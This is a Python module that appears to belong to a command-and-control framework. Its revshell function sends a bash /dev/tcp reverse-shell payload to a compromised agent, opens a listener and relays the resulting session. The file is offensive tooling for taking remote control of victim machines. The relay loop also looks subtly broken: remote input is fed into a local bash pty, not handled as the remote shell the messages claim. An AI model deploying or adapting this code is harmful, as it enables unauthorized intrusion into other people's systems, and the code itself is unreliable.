import os
import socket
import pty
import select
import signal
import tty
import termios
import struct
import fcntl
import threading
from colorama import Fore, Style


def detect_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _set_winsize(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)


def _terminal_size():
    try:
        import shutil
        return shutil.get_terminal_size()
    except Exception:
        return 80, 24


def revshell(manager, agent_id, c2_server):
    port = get_free_port()
    ip = detect_ip()
    cols, rows = _terminal_size()

    payload = f"bash -c 'bash -i &>/dev/tcp/{ip}/{port} 0>&1'"

    print(f"{Fore.CYAN}[*] Starting reverse shell listener on 0.0.0.0:{port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Agent will connect to {ip}:{port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Sending payload to agent...{Style.RESET_ALL}")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(15)

    tid = manager.send_task(agent_id, "shell", {"command": payload})
    if not tid:
        print(f"{Fore.RED}[!] Failed to send task{Style.RESET_ALL}")
        srv.close()
        return

    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print(f"{Fore.RED}[!] No connection within 15s{Style.RESET_ALL}")
        srv.close()
        return

    print(f"{Fore.GREEN}[+] Reverse shell received from {addr}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] You now have a real shell. Type 'exit' to return.{Style.RESET_ALL}")
    srv.close()

    pid, fd = pty.fork()
    if pid == 0:
        for fd2 in (0, 1, 2):
            try:
                os.close(fd2)
            except OSError:
                pass
        try:
            os.setsid()
        except OSError:
            pass
        os.environ["TERM"] = os.environ.get("TERM", "xterm-256color")
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
        os._exit(1)

    old = termios.tcgetattr(0)
    try:
        tty.setraw(0)
        _set_winsize(fd, rows, cols)

        def _sigwinch(sig, frame):
            nonlocal cols, rows
            cols, rows = _terminal_size()
            _set_winsize(fd, rows, cols)

        signal.signal(signal.SIGWINCH, _sigwinch)

        while True:
            r, _, _ = select.select([conn, fd, 0], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(fd, data)
            if fd in r:
                data = os.read(fd, 4096)
                if not data:
                    break
                conn.send(data)
            if 0 in r:
                data = os.read(0, 4096)
                if not data:
                    break
                conn.send(data)
    except (EOFError, OSError, KeyboardInterrupt):
        pass
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        os.close(fd)
        conn.close()
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
        print(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}")
